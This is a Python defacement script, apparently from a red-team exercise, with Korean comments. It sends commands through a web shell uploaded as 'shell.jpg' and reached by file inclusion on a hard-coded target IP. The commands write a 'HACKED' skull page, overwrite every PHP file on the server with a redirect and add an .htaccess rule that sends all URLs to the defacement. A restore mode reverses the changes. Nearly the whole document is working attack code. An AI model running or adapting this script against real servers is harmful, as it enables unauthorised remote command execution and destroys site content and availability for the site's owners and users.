#!/usr/bin/env python3
"""
원격 Defacement 트리거
공격자 서버(13.158.67.78:5000)에서 신호를 보내면
모든 페이지가 해골 화면으로 장악됨
"""

import requests
import time

TARGET = "http://52.78.221.104"
WEBSHELL = f"{TARGET}/file.php?file=shell.jpg&cmd="

# 짧은 hacked.html 내용
HACKED_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>HACKED</title><style>*{margin:0;padding:0}body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}.skull{font-size:10px;line-height:1;white-space:pre}h1{font-size:3em;color:#f00;animation:b .5s infinite}@keyframes b{0%,100%{opacity:1}50%{opacity:.3}}</style></head><body><div><div class="skull">    _.--""-._
 ."         ".
/             \\
|,  .-.  .-.  ,|
| )(__/  \\__)( |
|/     /\\     \\|
(_     ^^     _)
 \\____________/</div><h1>HACKED</h1><p style="margin:20px 0">SYSTEM COMPROMISED</p><p>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p style="margin-top:20px">-- Red Team --</p></div></body></html>"""

HTACCESS = """RewriteEngine On
RewriteCond %{REQUEST_URI} !^/hacked\\.html$
RewriteRule ^(.*)$ /hacked.html [L,R=302]"""

def execute_cmd(cmd):
    """웹쉘을 통해 명령 실행"""
    try:
        response = requests.get(WEBSHELL + requests.utils.quote(cmd), timeout=10)
        return response.text
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def deploy_defacement():
    """Defacement 배포"""
    print("=" * 60)
    print("💀 Remote Defacement Deployment")
    print("=" * 60)
    print()

    # Step 1: hacked.html 생성
    print("[*] Step 1: Creating hacked.html...")
    cmd1 = f"echo '{HACKED_HTML}' > /var/www/html/hacked.html"
    result1 = execute_cmd(cmd1)
    if result1 is not None:
        print("[+] hacked.html created")
    else:
        print("[-] Failed to create hacked.html")
        return False

    time.sleep(0.5)

    # Step 2: 모든 PHP 파일 백업 및 리다이렉트 주입
    print("[*] Step 2: Backing up and redirecting PHP files...")
    cmd2 = "find /var/www/html -name '*.php' -type f -exec cp {} {}.bak \\;"
    execute_cmd(cmd2)
    print("[+] PHP files backed up")

    time.sleep(0.5)

    cmd3 = """find /var/www/html -name '*.php' -type f -exec sh -c 'echo "<?php header(\\"Location: /hacked.html\\"); exit; ?>" > "$1"' _ {} \\;"""
    execute_cmd(cmd3)
    print("[+] All PHP files redirecting to hacked.html")

    time.sleep(0.5)

    # Step 3: .htaccess 생성 (모든 요청 리다이렉트)
    print("[*] Step 3: Creating .htaccess...")
    cmd4 = f"echo '{HTACCESS}' > /var/www/html/.htaccess"
    result4 = execute_cmd(cmd4)
    if result4 is not None:
        print("[+] .htaccess created")
    else:
        print("[-] Failed to create .htaccess")
        return False

    print()
    print("=" * 60)
    print("✅ DEFACEMENT DEPLOYED")
    print("=" * 60)
    print()
    print("All pages now redirect to skull screen:")
    print(f"  • {TARGET}/")
    print(f"  • {TARGET}/login.php")
    print(f"  • {TARGET}/profile.php")
    print(f"  • {TARGET}/index.php")
    print(f"  • {TARGET}/anything")
    print()
    print("→ ALL URLs show the HACKED page!")
    print()

    return True

def restore_site():
    """사이트 복구"""
    print("=" * 60)
    print("🔧 Restoring Site")
    print("=" * 60)
    print()

    # .htaccess 삭제
    print("[*] Removing .htaccess...")
    execute_cmd("rm /var/www/html/.htaccess")
    print("[+] .htaccess removed")

    # hacked.html 삭제
    print("[*] Removing hacked.html...")
    execute_cmd("rm /var/www/html/hacked.html")
    print("[+] hacked.html removed")

    # PHP 파일 복구
    print("[*] Restoring PHP files...")
    execute_cmd("find /var/www/html -name '*.php.bak' -type f -exec sh -c 'mv \"$1\" \"${1%.bak}\"' _ {} \\;")
    print("[+] PHP files restored")

    print()
    print("✅ Site restored to normal")
    print()

if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == "restore":
        restore_site()
    else:
        deploy_defacement()
